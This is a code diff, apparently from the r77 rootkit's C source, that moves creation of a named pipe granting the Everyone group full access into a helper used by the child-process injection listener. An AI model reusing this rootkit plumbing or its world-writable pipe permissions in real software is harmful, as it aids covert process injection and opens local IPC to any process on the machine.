@@ -433,6 +433,38 @@ BOOL DeleteScheduledTask(LPCWSTR name)
 
 	return result;
 }
+HANDLE CreatePublicNamedPipe(LPCWSTR name)
+{
+	// Get security attributes for "EVERYONE", so the named pipe is accessible to all processes.
+
+	SID_IDENTIFIER_AUTHORITY authority = SECURITY_WORLD_SID_AUTHORITY;
+	PSID everyoneSid;
+	if (!AllocateAndInitializeSid(&authority, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyoneSid)) return INVALID_HANDLE_VALUE;
+
+	EXPLICIT_ACCESSW explicitAccess;
+	ZeroMemory(&explicitAccess, sizeof(EXPLICIT_ACCESSW));
+	explicitAccess.grfAccessPermissions = FILE_ALL_ACCESS;
+	explicitAccess.grfAccessMode = SET_ACCESS;
+	explicitAccess.grfInheritance = NO_INHERITANCE;
+	explicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+	explicitAccess.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+	explicitAccess.Trustee.ptstrName = (LPWSTR)everyoneSid;
+
+	PACL acl;
+	if (SetEntriesInAclW(1, &explicitAccess, NULL, &acl) != ERROR_SUCCESS) return INVALID_HANDLE_VALUE;
+
+	PSECURITY_DESCRIPTOR securityDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
+	if (!securityDescriptor ||
+		!InitializeSecurityDescriptor(securityDescriptor, SECURITY_DESCRIPTOR_REVISION) ||
+		!SetSecurityDescriptorDacl(securityDescriptor, TRUE, acl, FALSE)) return INVALID_HANDLE_VALUE;
+
+	SECURITY_ATTRIBUTES securityAttributes;
+	securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+	securityAttributes.lpSecurityDescriptor = securityDescriptor;
+	securityAttributes.bInheritHandle = FALSE;
+
+	return CreateNamedPipeW(name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, &securityAttributes);
+}
 
 BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 {
@@ -1112,37 +1144,9 @@ VOID UninstallR77Config()
 
 DWORD WINAPI ChildProcessListenerThread(LPVOID parameter)
 {
-	// Get security attributes for "EVERYONE", so the named pipe is accessible to all processes.
-
-	SID_IDENTIFIER_AUTHORITY authority = SECURITY_WORLD_SID_AUTHORITY;
-	PSID everyoneSid;
-	if (!AllocateAndInitializeSid(&authority, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyoneSid)) return 0;
-
-	EXPLICIT_ACCESSW explicitAccess;
-	ZeroMemory(&explicitAccess, sizeof(EXPLICIT_ACCESSW));
-	explicitAccess.grfAccessPermissions = FILE_ALL_ACCESS;
-	explicitAccess.grfAccessMode = SET_ACCESS;
-	explicitAccess.grfInheritance = NO_INHERITANCE;
-	explicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
-	explicitAccess.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
-	explicitAccess.Trustee.ptstrName = (LPWSTR)everyoneSid;
-
-	PACL acl;
-	if (SetEntriesInAclW(1, &explicitAccess, NULL, &acl) != ERROR_SUCCESS) return 0;
-
-	PSECURITY_DESCRIPTOR securityDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
-	if (!securityDescriptor ||
-		!InitializeSecurityDescriptor(securityDescriptor, SECURITY_DESCRIPTOR_REVISION) ||
-		!SetSecurityDescriptorDacl(securityDescriptor, TRUE, acl, FALSE)) return 0;
-
-	SECURITY_ATTRIBUTES securityAttributes;
-	securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
-	securityAttributes.lpSecurityDescriptor = securityDescriptor;
-	securityAttributes.bInheritHandle = FALSE;
-
 	while (true)
 	{
-		HANDLE pipe = CreateNamedPipeW(sizeof(LPVOID) == 4 ? CHILD_PROCESS_PIPE_NAME32 : CHILD_PROCESS_PIPE_NAME64, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, &securityAttributes);
+		HANDLE pipe = CreatePublicNamedPipe(sizeof(LPVOID) == 4 ? CHILD_PROCESS_PIPE_NAME32 : CHILD_PROCESS_PIPE_NAME64);
 		while (pipe != INVALID_HANDLE_VALUE)
 		{
 			if (ConnectNamedPipe(pipe, NULL))
